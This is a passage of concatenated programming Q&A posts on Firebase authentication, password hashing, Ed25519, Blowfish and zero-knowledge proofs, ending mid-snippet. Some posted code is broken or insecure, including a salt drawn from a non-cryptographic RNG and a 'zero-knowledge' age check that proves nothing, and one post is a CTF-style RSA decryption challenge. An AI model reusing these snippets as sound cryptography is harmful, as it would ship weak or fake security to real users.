      context: context,
      builder: (context) {
        return const AlertDialog(
          title: Text(&quot;Yanlış e-posta&quot;),
        );
      },
    );
  }

  // wrong password message

  void wrongPassword() {
    showDialog(
      context: context,
      builder: (context) {
        return const AlertDialog(
          title: Text(&quot;Yanlış parola&quot;),
        );
      },
    );
  }
</code></pre>
<p>Here is my HomeRoute;</p>
<pre><code>

import 'package:firebase_auth/firebase_auth.dart';
import 'package:flutter/material.dart';

class HomeRoute extends StatelessWidget {
  HomeRoute({super.key});

  final user = FirebaseAuth.instance.currentUser!;

  // log out user

  void logoutUser() {
    FirebaseAuth.instance.signOut();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        automaticallyImplyLeading: false,
        title: const Text(&quot;Home Route&quot;),
        actions: [
          IconButton(
            icon: const Icon(Icons.logout),
            onPressed: logoutUser,
          ),
        ],
      ),
      body: Center(
        child: Text(&quot;${user.email!} olarak giriş yapıldı&quot;),
      ),
    );
  }
}


</code></pre>
"
"<p>I am facing a problem with Flutter when building Apps.</p>
<p>If I build the non release (debug) for my App and I get the android build and send to my mobile phone I can use the app developed without any issues.</p>
<p>So when I try to build as release and navigate across some cards, login for example, I get
&quot;No suitable CryptoEngine could be loaded&quot;</p>
<p>My intention is to fix this on dart/flutter layer so the build would behave the same for iOS and Android (assuming here).</p>
<p>I tried on gradle build for Kotlin to add bouncy castle but did not have success.</p>
<p>Any ideas about what is happening and how to solve that?</p>
<p>Flutter 3.16.9 • channel stable • <a href=""https://github.com/flutter/flutter.git"" rel=""nofollow noreferrer"">https://github.com/flutter/flutter.git</a>
Framework • revision 41456452f2 (6 weeks ago) • 2024-01-25 10:06:23 -0800
Engine • revision f40e976bed
Tools • Dart 3.2.6 • DevTools 2.28.5</p>
"
"<p>I'm using react.js as fron-end &amp; laravel for creating API's for web app</p>
<p>in react.js i'm using firebase to get <code>googleAuth</code> then sending it Laravel App
in Laravel i'm using <code>&quot;kreait/laravel-firebase&quot;: &quot;^5.7&quot;,</code></p>
<p><code>SocialRegister</code> is working fine for me in Laravel side</p>
<p>When i'm trying to log user in using the code below</p>
<pre><code>  try {
        /** @var FirebaseAuth $firebaseAuth */
        $firebaseAuth = app(FirebaseAuth::class);

        // Verify the ID token
        $verifiedIdToken = $firebaseAuth-&gt;verifyIdToken($request-&gt;access_token);

        // Extract claims from the verified ID token
        $uid = $verifiedIdToken-&gt;claims()-&gt;get('sub');
        $userEmail = $verifiedIdToken-&gt;claims()-&gt;get('email');

        // Check if the user already exists in your database
        $existingUser = AppUser::where('email', $userEmail)-&gt;first();

        if ($existingUser) {
            // User already exists, return an error or handle it as per your requirements
            return $this-&gt;sendresponse('false', 'user already exists', null);
        }


        $user = AppUser::create([
            &quot;email&quot; =&gt; $request-&gt;email,
            &quot;name&quot; =&gt; $request-&gt;name,
            &quot;access_token&quot; =&gt; $uid, // Save Firebase UID for future reference
        ]);


        // Return success response
        return $this-&gt;sendresponse('true', 'user registered successfully', ['user' =&gt; $user]);
    } catch (\Throwable $e) {
        // Handle registration errors
        return $this-&gt;sendresponse('false', 'registration error', $e-&gt;getMessage());
    }
</code></pre>
<p>`</p>
<p>Then i'm getting this error</p>
<blockquote>
<p>The value 'eyJhbGciOiJSUzI...' is not a verified ID token: - - The token was issued in the future</p>
</blockquote>
<p>I even tried changing <code>timezone</code> of my laravel app but it didn't worked</p>
"
"<h1>tl;dr</h1>
<ul>
<li>Resource needed which ensures and shows how to use the <strong>elliptic curve</strong> called <strong>Ed25519 / Curve25519</strong> along <strong>Spring-Boot</strong> authorization server.</li>
</ul>
<h1>Objectives</h1>
<ul>
<li>Use of <strong>elliptic curve</strong> (EC) cryptography provided by <strong>Spring-Boot</strong></li>
<li>Use of <strong>Ed25519 / Curve25519</strong> as it is used by 'trustworthy' organizations
<ul>
<li><a href=""https://de.wikipedia.org/wiki/Curve25519"" rel=""nofollow noreferrer"">Wikipedia - Curve25519</a></li>
<li><a href=""https://ianix.com/pub/ed25519-deployment.html"" rel=""nofollow noreferrer"">Things that use Ed25519</a></li>
<li><a href=""https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#algorithms"" rel=""nofollow noreferrer"">Open Worldwide Application Security Project (OWASP) - Algorithms</a></li>
</ul>
</li>
<li>Needed for ...
<ul>
<li>Key generation -&gt; JWK</li>
<li>Encryption (&amp; Decryption) -&gt; JWE</li>
<li>Signing -&gt; JWS</li>
<li>Token generation -&gt; JWT</li>
</ul>
</li>
</ul>
<h1>Setup</h1>
<ul>
<li>Java : 21</li>
<li>Spring Boot : v3.2.x</li>
<li>spring-security-oauth2-authorization-server : 1.2.x</li>
</ul>
<h1>Pre-Research</h1>
<ul>
<li><strong>Spring-Boot</strong> uses the com.nimbusds.jose library internally (<a href=""https://mvnrepository.com/artifact/org.springframework.security/spring-security-core"" rel=""nofollow noreferrer"">Since ~2020, ~v5.1</a>).
<ul>
<li>Likewise questions have been asked 'before 2018' (afaik)</li>
<li>RSA is supported</li>
<li>Elliptic Curves are supported (generally)
<ul>
<li>Use of 'Ed25519 / Curve25519' - unknown</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>Still there are multiple classes that offer EC-functionality around 'Ed25519 / Curve25519'</p>
<h2>Key generation, compatible to <code>java.security.KeyPair</code></h2>
<pre class=""lang-java prettyprint-override""><code>    static KeyPair generateEcKeyPairUsingEd25519() {
        KeyPair keyPair;
        try {
            KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance(&quot;Ed25519&quot;);
            keyPair = keyPairGenerator.generateKeyPair();
        } catch (NoSuchAlgorithmException e) {
            throw new IllegalStateException(&quot;JVM does not support Ed25519 algorithm&quot;, e);
        }
        return keyPair;
    }
</code></pre>
<h2>Interfaces are provided as well</h2>
<pre class=""lang-java prettyprint-override""><code>        import java.security.interfaces.EdECPrivateKey;
        import java.security.interfaces.EdECPublicKey;

        KeyPair ecKeyPair = generateEcKeyPairUsingEd25519()

        EdECPublicKey edEcPublicKey = (EdECPublicKey) ecKeyPair.getPublic();
        EdECPrivateKey edEcPrivateKey = (EdECPrivateKey) ecKeyPair.getPrivate();
</code></pre>
<h1>Re-assuring</h1>
<ul>
<li>Is this already too deep into the rabbit hole?</li>
<li>Is <strong>Spring-Boot</strong> already using Ed25519 for JWK, JWE, JWS and JWT without me noticing?</li>
<li>Is there a suitable <strong>Ed25519 / Curve25519</strong> reference imlementation?</li>
</ul>
<h1>Problem</h1>
<p>Spring Boot : v3.2.x</p>
<pre><code>&lt;dependency&gt;
    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
    &lt;artifactId&gt;spring-boot-starter-oauth2-resource-server&lt;/artifactId&gt;
    &lt;version&gt;${spring-boot.version}&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
<p>To my knowledge the used <code>com.nimbusds.jose.*</code> supports JWK, JWE, JWS and JWT with RSA and for EC genearlly.</p>
<p>Keypairs as seen above can be generated, but they can - to my knowledge - not be used in the example below.</p>
<h2>Example</h2>
<pre class=""lang-java prettyprint-override""><code>    @Bean
    public JwtDecoder jwtDecoder() {
        KeyPair keyPair = this.getKeyPair();
        RSAPublicKey rsaPublicKey = (RSAPublicKey) keyPair.getPublic();
        return NimbusJwtDecoder.withPublicKey(rsaPublicKey).build();
    }

    @Bean
    JwtEncoder jwtEncoder() {
        KeyPair keyPair = this.getKeyPair();
        RSAPublicKey rsaPublicKey = (RSAPublicKey) keyPair.getPublic();
        RSAPrivateKey rsaPrivateKey = (RSAPrivateKey) keyPair.getPrivate();

        JWK jwk = new RSAKey.Builder(rsaPublicKey)
                .privateKey(rsaPrivateKey).build();

        JWKSource&lt;SecurityContext&gt; jwks = new ImmutableJWKSet&lt;&gt;(new JWKSet(jwk));
        return new NimbusJwtEncoder(jwks);
    }
</code></pre>
<h1>Finally</h1>
<ul>
<li>How to use Ed25519 / Curve25519 with SpringBoot for JWK, JWE, JWS and JWT security?</li>
</ul>
"
"<p>we have an old software system written in python which uses the following password hash functions:</p>
<pre class=""lang-py prettyprint-override""><code>import hashlib, binascii, os
 
def hash_password(password):
    &quot;&quot;&quot;Hash a password for storing.&quot;&quot;&quot;
    salt = hashlib.sha256(os.urandom(60)).hexdigest().encode('ascii')
    pwdhash = hashlib.pbkdf2_hmac('sha512', password.encode('utf-8'), 
                                salt, 100000)
    pwdhash = binascii.hexlify(pwdhash)
    return (salt + pwdhash).decode('ascii')
 
def verify_password(stored_password, provided_password):
    &quot;&quot;&quot;Verify a stored password against one provided by user&quot;&quot;&quot;
    salt = stored_password[:64]
    stored_password = stored_password[64:]
    pwdhash = hashlib.pbkdf2_hmac('sha512', 
                                  provided_password.encode('utf-8'), 
                                  salt.encode('ascii'), 
                                  100000)
    pwdhash = binascii.hexlify(pwdhash).decode('ascii')
    return pwdhash == stored_password
</code></pre>
<p>We tried to migrate this code to .net 8 but couldn't get the right results
=&gt; the generated hash in python is not equal to the generated hash in C#</p>
<p>Does anyone has an idea what could be wrong with our approach?</p>
<p>Here is what we've tried:</p>
<pre class=""lang-cs prettyprint-override""><code>public string HashPassword(string password)
    {
        var salt = Encoding.ASCII.GetBytes(GenerateRandomString(60));

        using var pbkdf2 = new Rfc2898DeriveBytes(
            Encoding.UTF8.GetBytes(password),
            salt,
            100000,
            HashAlgorithmName.SHA512);
        var hashedPassword = pbkdf2.GetBytes(64);

        return Encoding.ASCII.GetString(salt.Concat(hashedPassword).ToArray());
    }

    public bool VerifyPassword(string password, string hash)
    {
        var salt = hash[..64];
        var passwordHash = Encoding.UTF8.GetBytes(hash[64..]);
        
        using var pbkdf2 = new Rfc2898DeriveBytes(
            Encoding.UTF8.GetBytes(password),
            Encoding.ASCII.GetBytes(salt),
            100000,
            HashAlgorithmName.SHA512);
        var hashedPassword = pbkdf2.GetBytes(64);
        
        return hashedPassword.SequenceEqual(passwordHash);
    }

private string GenerateRandomString(int length)
    {
        var sb = new StringBuilder();  
        var random = new Random();

        for (int i = 0; i &lt; length; i++)
        {
            double flt = random.NextDouble();
            int shift = Convert.ToInt32(Math.Floor(25 * flt));
            char letter = Convert.ToChar(shift + 65);
            sb.Append(letter);  
        }

        return sb.ToString();
    }
</code></pre>
"
"<p>I am trying to build an &quot;edit account&quot; page in Unity using firebase, and for some reason everything works just fine except when I try to call user.UpdateEmailAsync(email). It returns this exception: Firebase.FirebaseException: This operation is not allowed. You must enable this service in the console.</p>
<p><img src=""https://i.stack.imgur.com/7ZgkM.png"" alt=""Email/Password sign-in method enabled in firebase console"" />
Email/Password sign-in method enabled in firebase console</p>
<p>I do have email/password authentication enabled in the firebase console, so I'm not sure how to solve this exception
Note: I don't get this exception when signing up users, only when i attempt to update their email.</p>
"
"<p>I am getting this warning:</p>
<blockquote>
<p>Creating user with &lt;email&gt; with empty reCAPTCHA token</p>
</blockquote>
<p>It is assumed that the recaptcha is only used when registering with the phone, the documentation does not mention that it needs to be recaptcha using the email and password.</p>
<p>Do you have any idea to fix this? I know that is just like a warning, but its weird.</p>
<pre><code>package com.integriapp.encuestamovilidad

import android.content.Intent
import android.os.Bundle
import android.util.Log
import android.widget.Button
import android.widget.EditText
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import com.google.firebase.Firebase
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.auth.auth


class AuthActivity : AppCompatActivity() {

    private lateinit var auth: FirebaseAuth
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_auth)
        auth = Firebase.auth
        auth.setLanguageCode(&quot;es&quot;)


        setup()
    }
    fun setup(){
        title = &quot;Autenticación&quot;
        val signUpBtn = findViewById&lt;Button&gt;(R.id.signUpBtn)
        val loginBtn = findViewById&lt;Button&gt;(R.id.loginBtn)
        val emailTxt = findViewById&lt;EditText&gt;(R.id.emailTxt)
        val passwordTxt = findViewById&lt;EditText&gt;(R.id.passwordTxt)

        signUpBtn.setOnClickListener {
            Log.d(&quot;EncuestaMovilidad&quot;, &quot;setOnClickListener&quot;)
            val email = emailTxt.text.toString()
            val password = passwordTxt.text.toString()

            if (email.isEmpty() || password.isEmpty()) {
                Log.d(&quot;EncuestaMovilidad&quot;, &quot;email and password empty&quot;)
                return@setOnClickListener
            }

            // Crear un nuevo usuario con las credenciales
            auth.createUserWithEmailAndPassword(email, password)
                .addOnCompleteListener { task -&gt;
                    if (task.isSuccessful) {
                        Log.d(&quot;EncuestaMovilidad&quot;, &quot;SUCCESS&quot;)
                        // Navegar a la siguiente actividad o realizar acciones
                        // tras el registro exitoso
                        val uid = Firebase.auth.currentUser?.uid
                        Log.d(&quot;EncuestaMovilidad&quot;, &quot;uid: $uid&quot;)
                        showHome(task.result.user?.email.toString(), ProviderType.BASIC)
                    } else {
                        val exception = task.exception
                        showErrorAlert(&quot;${exception?.message}&quot;)
                        Log.e(&quot;EncuestaMovilidad&quot;, &quot;createUserWithEmail:failure&quot;, task.exception)
                    }
                }
        }

        loginBtn.setOnClickListener {
            Log.d(&quot;EncuestaMovilidad&quot;, &quot;setOnClickListener&quot;)
            val email = emailTxt.text.toString()
            val password = passwordTxt.text.toString()

            if (email.isEmpty() || password.isEmpty()) {
                Log.d(&quot;EncuestaMovilidad&quot;, &quot;email and password empty&quot;)
                return@setOnClickListener
            }

            // Iniciar sesión con las credenciales del usuario
            auth.signInWithEmailAndPassword(email, password)
                .addOnCompleteListener { task -&gt;
                    if (task.isSuccessful) {
                        Log.d(&quot;EncuestaMovilidad&quot;, &quot;SUCCESS&quot;)

                        val uid = Firebase.auth.currentUser?.uid
                        Log.d(&quot;EncuestaMovilidad&quot;, &quot;uid: $uid&quot;)
                        showHome(task.result.user?.email.toString(), ProviderType.BASIC)
                    } else {
                        val exception = task.exception
                        showErrorAlert(&quot;${exception?.message}&quot;)
                        Log.e(&quot;EncuestaMovilidad&quot;, &quot;signInWithEmail:failure&quot;, exception)
                    }
                }
        }

    }
    private fun showErrorAlert(msj: String) {
        try {
            val builder: AlertDialog.Builder = AlertDialog.Builder(this)
            builder
                .setTitle(&quot;Error&quot;)
                .setMessage(msj)
                .setPositiveButton(&quot;Aceptar&quot;,null)

            val dialog: AlertDialog = builder.create()
            dialog.show()
        } catch (e: Exception) {
            Log.e(&quot;AlertDialog&quot;, &quot;Error al mostrar el diálogo de alerta:&quot;, e)
        }
    }

    private fun showHome(email: String, provider: ProviderType){
        val homeIntent = Intent(this, HomeActivity::class.java).apply {
            putExtra(&quot;Email&quot;, email)
            putExtra(&quot;Provider&quot;, provider.toString())
        }
        startActivity(homeIntent)
    }
}
</code></pre>
"
"<p>In RSA, a small e value can be problematic, but what about N? Can you decrypt this? values&quot;Decrypt my super sick RSA:
c: 240986837130071017759137533082982207147971245672412893755780400885108149004760496
n: 831416828080417866340504968188990032810316193533653516022175784399720141076262857
e: 65537&quot;</p>
<p>i have truied many times to solve</p>
"
"<p>I am utilizing Firebase and SwiftUI for a personal project. I am working on the auth page, and whenever I log in by pressing the SignIn button this is output in console. I am just curious as to what this means when in the context of auth and why it may occur?</p>
<blockquote>
<p>2024-03-01 00:24:10.358620-0800 AppName[40641:339881] [connection] nw_proxy_resolver_create_parsed_array [C1.1.1 proxy pac] Evaluation error: kCFErrorDomainCFNetwork: 308
2024-03-01 00:24:10.544679-0800 AppName[40641:340582] [connection] nw_proxy_resolver_create_parsed_array [C2.1.1 proxy pac] Evaluation error: kCFErrorDomainCFNetwork: 308</p>
</blockquote>
<p>my authViewModel:</p>
<pre><code>@MainActor
class AuthViewModel: ObservableObject{
    @Published var userSession: FirebaseAuth.User?
    @Published var currentUser: User?
    
    init(){
        // firebase cache if current user on device is Authenticated, so we can check!
        self.userSession = Auth.auth().currentUser
    }
    
func login(email: String, password: String) async throws{
    do{
        let result = try await Auth.auth().signIn(withEmail: email, password: password)
        self.userSession = result.user
    } catch{
        print(&quot;DEBUG \(error.localizedDescription)&quot;)
    }
}
</code></pre>
<p>I am calling this function from my <code>authViewModel</code> in a SwiftUI view called <code>LoginView</code>:</p>
<pre><code>Button{
                    if email.count == 0 || password .count == 0{
                        return
                    }else{
                        Task{
                            try await authViewModel.login(email: email, password: password)
                        }
                    }
                 
                } label: {
                    Text(&quot;Sign In&quot;)
                        .bold()
                        .frame(width: 200, height: 40)
                        
                        .background(RoundedRectangle(cornerRadius: 10, style: .continuous)
                            .fill(.linearGradient(colors: [.pink, .red], startPoint: .top, endPoint: .bottomTrailing)))
                        .foregroundColor(.white)
                }
                .padding(.top)
</code></pre>
<p>How I navigate to page once user is authenticated:</p>
<pre><code>struct ContentView: View {
    @EnvironmentObject var authViewModel: AuthViewModel
    var body: some View {
        Group{
            if authViewModel.userSession != nil{
                ListView()
            }else{
                LoginView()
            }
        }
    }
}
</code></pre>
<p>Finally my swift App file:</p>
<pre><code>struct LandanApp: App {
    @StateObject var authViewModel = AuthViewModel()
  @UIApplicationDelegateAdaptor(AppDelegate.self) var delegate


  var body: some Scene {
    WindowGroup {
      NavigationView {
        ContentView()
              .environmentObject(authViewModel)
      }
    }
  }
}
</code></pre>
<p>I just pressed &quot;Sign in&quot; and got this message in console log.</p>
"
"<p>I am able to make the sign-in with the following code, when there is no application restriction on the key in the GoogleService-Info.plist file:</p>
<pre><code>Future&lt;void&gt; linkWithGoogle() async {
    var googleProvider = GoogleAuthProvider();
    googleProvider.addScope('https://www.googleapis.com/auth/userinfo.email');
    googleProvider.addScope('https://www.googleapis.com/auth/userinfo.profile');

    try {
      await _auth.currentUser!.linkWithProvider(googleProvider);
    } on FirebaseAuthException catch(e) {
      log('Error: Failed to link with Google: ${e.code} - ${e.message}');
    }
}
</code></pre>
<p>But if I enable iOS application restriction by adding my apps bundle if in the google cloud console I get a 403 with the message: &quot;Requests from this iOS client application &lt;empty&gt; are blocked.&quot;</p>
<p>I found that the app must be identified with a custom header (at least when using the API): <code>'x-ios-bundle-identifier': 'servicecontrol.googleapis.com/&lt;bundle.id&gt;'</code>.</p>
<p>How can this be done while using the SDK?</p>
"
"<p>I am trying to apply phone Authentication in flutter application but it provide me errors, recently i have applyed sign In option with gemail and password that was working correctly.</p>
<pre class=""lang-none prettyprint-override""><code>I/zzb     ( 7091): ForceRecaptchaV2Flow from phoneAuthOptions = false, ForceRecaptchav2Flow from firebaseSettings = falseW/System  ( 7091): Ignoring header X-Firebase-Locale because its value was null.
E/zzb     ( 7091): Failed to initialize reCAPTCHA config: No Recaptcha Enterprise siteKey configured for tenant/project *I/PlayCore( 7091): UID: [10154]  PID: [7091] IntegrityService : requestIntegrityToken(IntegrityTokenRequest{nonce=tBXImkkf1PZ3NA1gRGiNfbyCwChtfRlMWExRZO74O1o, cloudProjectNumber=551503664846, network=null})
I/PlayCore( 7091): UID: [10154]  PID: [7091] IntegrityService : Initiate binding to the service.
I/PlayCore( 7091): UID: [10154]  PID: [7091] IntegrityService : ServiceConnectionImpl.onServiceConnected(ComponentInfo{com.android.vending/com.google.android.finsky.integrityservice.IntegrityService})
I/PlayCore( 7091): UID: [10154]  PID: [7091] IntegrityService : linkToDeath
I/PlayCore( 7091): UID: [10154]  PID: [7091] OnRequestIntegrityTokenCallback : onRequestIntegrityToken
I/PlayCore( 7091): UID: [10154]  PID: [7091] IntegrityService : Unbind from service.
W/System  ( 7091): Ignoring header X-Firebase-Locale because its value was null.
E/FirebaseAuth( 7091): [SmsRetrieverHelper] SMS verification code request failed: unknown status code: 17028 Invalid app 
info in play_integrity_token
D/FirebaseAuth( 7091): Invoking original failure callbacks after phone verification failure for +923225549819, error - This app is not authorized to use Firebase Authentication. Please verify that the correct package name, SHA-1, and SHA-256 
are configured in the Firebase Console. [ Invalid app info in play_integrity_token ]
</code></pre>
<p>I am trying to applay phone Authentication and get OTP.</p>
"
"<p>Having multiple ACL with user records and password generated with.</p>
<pre><code>bcrypt.hashSync(request.password, bcrypt.genSaltSync(8))
</code></pre>
<p>We can compareSync these passwords without the need to generate the salt using the compareSync() method.</p>
<pre><code>bcrypt.compareSync(request.password, ACL.password)
</code></pre>
<p>I understand that bcrypt hashes contain the salt, hence the compareSync method does not require the sale to compare a hash with a password [string].</p>
<p>Using crypt to generate a salt and hash the password I can neither compare the hashes generated from pbkdf2Sync with scryptSync methods, nor with the bcrypt hash.</p>
<pre><code>let cryptoSalt = crypto.randomBytes(8).toString('base64')

let pbkdf2Hash = crypto.pbkdf2Sync(request.password, cryptoSalt, 1000, 44, 'sha512').toString('base64')

let scryptHash = crypto.scryptSync(request.password, cryptoSalt, 44).toString('base64')
</code></pre>
<p>Is there any way to use crypto to generate a hash that can be compared to a hash generated with bcrypt?</p>
<p>Should it be possible to create the same [base64] hash from pbkdf2Sync and scryptSync using the same salt?</p>
"
"<p>Suppose I have a super simple symmetric-key algorithm, and by super simple I mean it's a straight-up extension of the Caesar Cipher.</p>
<p>If I were to provide ciphertext <em>AND</em> the secret key that was used to encrypt it, what would be the expected probability of someone decrypting it?</p>
<p>I understand the math behind the calculations when the key is secret, but what about if the key <em>is</em> known? Should a typical computer be expected to break it within a reasonable timeframe?</p>
<p>I looked at different symmetric-key breaking techniques but I don't believe any of them will be able to break this algorithm <em>even</em> if the secret key is known. Hence my confusion and the question.</p>
"
"<p>Is there a way to create zk proof that a particular key and value are present on a JSON without giving information about that key/value?</p>
<p>For example:</p>
<pre><code>[
    {
        &quot;name&quot;: &quot;john&quot;,
        &quot;balance&quot;: &quot;2&quot;
    },
    {
        &quot;name&quot;: &quot;peter&quot;,
        &quot;balance&quot;: &quot;1&quot;
    },
    {
        &quot;name&quot;: &quot;alice&quot;,
        &quot;balance&quot;: &quot;6&quot;
    },
    {
        &quot;name&quot;: &quot;bob&quot;,
        &quot;balance&quot;: &quot;4&quot;
    }
]
</code></pre>
<p>I want to prove that the JSON contains an entry with a key <code>name</code> and value <code>john</code> without giving away that information.</p>
<p>I have checked different zk frameworks but only seen merkle tree proof of membership given some leaves.</p>
"
"<p>I need to convert a JCE based code to a Bouncy Castle based code. I'm completely new to Bouncy Castle and couldn't find a easy-to-understand introduction to this topic in general or my issue specifically. This is the JCE based class:</p>
<pre class=""lang-java prettyprint-override""><code>import java.security.NoSuchAlgorithmException;
import java.security.Security;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

import com.sun.crypto.provider.SunJCE;

public class JCEBlowfishEncrypterDecrypter {
    
    private static final String ALGORITHM = &quot;Blowfish&quot;;
    public static SecretKeySpec key;

    public static String crypt(String msg, String k) throws Exception {
        SecretKeySpec key = init(k);
        return Hex.byte2hex(intCrypt(msg, key));
    }

    public static String decrypt(String msg, String k) throws Exception {
        SecretKeySpec key = init(k);
        return new String(intDecrypt(Hex.hex2byte(msg), key));
    }

    private static byte[] intCrypt(String msg, SecretKeySpec key) throws Exception {
        Cipher cipher = Cipher.getInstance(ALGORITHM);
        cipher.init(1, key);
        return cipher.doFinal(msg.getBytes());
    }

    private static byte[] intDecrypt(byte encrypted[], SecretKeySpec key) throws Exception {
        Cipher cipher = Cipher.getInstance(ALGORITHM);
        cipher.init(2, key);
        return cipher.doFinal(encrypted);
    }

    private static SecretKeySpec init(String myKey) throws NoSuchAlgorithmException {
        SunJCE sunJce = new SunJCE();
        Security.addProvider(sunJce);
        byte raw[] = myKey.getBytes();
        return new SecretKeySpec(raw, ALGORITHM);
    }

}

</code></pre>
<p>... And this is the Bouncy Castle based class:</p>
<pre class=""lang-java prettyprint-override""><code>import org.bouncycastle.crypto.BufferedBlockCipher;
import org.bouncycastle.crypto.engines.BlowfishEngine;
import org.bouncycastle.crypto.paddings.PKCS7Padding;
import org.bouncycastle.crypto.paddings.PaddedBufferedBlockCipher;
import org.bouncycastle.crypto.params.KeyParameter;

public class BouncyCastleBlowfishEncrypterDecrypter {

    public static String crypt(String msg, String key) throws Exception {
        PaddedBufferedBlockCipher cipher = new PaddedBufferedBlockCipher(new BlowfishEngine(), new PKCS7Padding());
        cipher.init(true, new KeyParameter(key.getBytes()));
        byte[] inputAsBytes = msg.getBytes();
        byte[] encryptedAsBytes = new byte[cipher.getOutputSize(inputAsBytes.length)];
        int numberOfBytesCopiedOnEncryptedAsBytes = cipher.processBytes(inputAsBytes, 0, inputAsBytes.length,
                encryptedAsBytes, 0);
        cipher.doFinal(encryptedAsBytes, numberOfBytesCopiedOnEncryptedAsBytes);
        return Hex.byte2hex(encryptedAsBytes);
    }

    public static String decrypt(String msg, String key) throws Exception {
        PaddedBufferedBlockCipher cipher = new PaddedBufferedBlockCipher(new BlowfishEngine(), new PKCS7Padding());
        cipher.init(false, new KeyParameter(key.getBytes()));
        byte[] outputConvertedAsBytes = Hex.hex2byte(msg);
        byte[] decryptedAsBytes = new byte[cipher.getOutputSize(outputConvertedAsBytes.length)];
        int numberOfBytesCopiedOnDecryptedAsBytes = cipher.processBytes(outputConvertedAsBytes, 0,
                outputConvertedAsBytes.length, decryptedAsBytes, 0);
        cipher.doFinal(decryptedAsBytes, numberOfBytesCopiedOnDecryptedAsBytes);
        return new String(decryptedAsBytes);
    }
}

</code></pre>
<p>... And this is the main method:</p>
<pre class=""lang-java prettyprint-override""><code>
    public static void main(String[] args) throws Exception {
        String encrypted = JCEBlowfishEncrypterDecrypter.crypt(&quot;Test&quot;, &quot;mmTSQOFzSL9xAwXGLMEe1Q==&quot;);
        String decrypted = JCEBlowfishEncrypterDecrypter.decrypt(encrypted, &quot;mmTSQOFzSL9xAwXGLMEe1Q==&quot;);

        System.out.println(&quot;--------------&quot;);
        System.out.println(&quot;encrypted   -&gt; &quot; + encrypted);
        System.out.println(&quot;decrypted -&gt; &quot; + decrypted);
        
        encrypted = BouncyCastleBlowfishEncrypterDecrypter.crypt(&quot;Test&quot;,
                &quot;mmTSQOFzSL9xAwXGLMEe1Q==&quot;);
        decrypted = BouncyCastleBlowfishEncrypterDecrypter.decrypt(encrypted,
                &quot;mmTSQOFzSL9xAwXGLMEe1Q==&quot;);

        System.out.println(&quot;--------------&quot;);
        System.out.println(&quot;encrypted   -&gt; &quot; + encrypted);
        System.out.println(&quot;decrypted -&gt; &quot; + decrypted);
    }
</code></pre>
<p>... But I get some strange additional characters when decrypting:
What's wrong?</p>
<p><a href=""https://i.stack.imgur.com/0hWsR.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/0hWsR.png"" alt=""enter image description here"" /></a></p>
"
"<p>The following program is meant to verify that the age of the client is within the required range, without the server having to know the age of that client. I mean
to use zero knowledge proofs to accomplish that. Sadly, the program tells me
that the age is not within the range for the numbers such as 15, 25, 75.</p>
<pre><code>#!/usr/bin/env python3

from Cryptodome.Util import number
from Cryptodome.Hash import SHA256


def main():
    print(
        &quot;This is happening client-side. There are secrets here such as my private key and my age.&quot;
    )
    private_key, public_key = generate_key_pair()
    print(&quot;Private Key:&quot;, private_key)
    print(&quot;Public Key:&quot;, public_key)
    age_to_prove = int(input(&quot;Your age?&quot;))
    print(&quot;Age to Prove:&quot;, age_to_prove)
    commitment, response = prove_age(private_key, age_to_prove)
    print(&quot;Proof Generated - Commitment:&quot;, commitment)
    print(&quot;Proof Generated - Response:&quot;, response)
    age_range_to_verify = (18, 70)
    verification_result = verify_age(
        public_key, commitment, response, age_range_to_verify
    )
    if verification_result:
        print(
            f&quot;Your age is within {age_range_to_verify[0]} to {age_range_to_verify[1]} range.&quot;
        )
    else:
        print(
            f&quot;Your age is not within {age_range_to_verify[0]} to {age_range_to_verify[1]} range.&quot;
        )


def generate_key_pair():
    # Generate a key pair (private key, public key)
    private_key = number.getRandomRange(1, 2**256)
    public_key = pow(2, private_key, 2**256 + 1)
    return private_key, public_key


def prove_age(private_key, age):
    # Step 1: Generate a random value
    r = number.getRandomRange(1, 2**256)
    # Step 2: Compute commitment
    commitment = pow(2, r, 2**256 + 1)
    # Step 3: Hash commitment and age
    challenge_input = str(commitment) + str(age)
    c = int.from_bytes(SHA256.new(challenge_input.encode(&quot;utf-8&quot;)).digest(), &quot;big&quot;) % (
        2**256
    )
    # Step 4: Compute response
    s = (r + private_key * c) % (2**256)
    # Return the proof (commitment, response)
    return commitment, s


def verify_age(public_key, commitment, response, age_range):
    print(
        &quot;This is happening server-side. I am not supposed to get to know the age of the client.&quot;
    )
    challenge_input = str(commitment) + str(age_range[0]) + str(age_range[1])
    c = int.from_bytes(SHA256.new(challenge_input.encode(&quot;utf-8&quot;)).digest(), &quot;big&quot;) % (
        2**256
    )
    verification_lhs = pow(2, response, 2**256 + 1)
    verification_rhs = (commitment * pow(public_key, c, 2**256 + 1)) % (2**256 + 1)

    return verification_lhs == verification_rhs


if __name__ == &quot;__main__&quot;:
    main()

</code></pre>
<p>What is wrong with this code? How do I prove in Python that an integer variable is within a certain range without having to reveal it <a href=""https://en.wikipedia.org/wiki/Zero-knowledge_proof"" rel=""nofollow noreferrer"">zero-knowledge proofs</a>? I would like to use bulletproofs for this - non-interactive zero-knowledge proofs.</p>
"
"<p>I want to incorporate Microsoft Login into this Flutter app. My school is hosting a competition, and all participants have Microsoft accounts. Integrating these accounts into the mobile app would be beneficial. I've already implemented the web version, which authenticates with Firebase. Now, I aim to create a mobile version that also authenticates with Firebase through Microsoft accounts. How can I achieve this? Is it possible to use a popup screen on mobile, similar to the web version? Below is the code that facilitates this functionality on the web, and I want to adapt it for mobile. Currently, the function triggers a popup when a button is clicked, guiding users through Microsoft's login process. However, I also have email and password fields available, which could be utilized for the mobile implementation.</p>
<pre><code>_loginWithMicrosoft() async {
        try {
          final provider = OAuthProvider(&quot;microsoft.com&quot;);
          provider.setCustomParameters({
            &quot;tenant&quot;: &quot;common&quot;,
            &quot;prompt&quot;: &quot;select_account&quot;,
          });
    
          // MicrosoftAuthCredential mAuth = Credential();
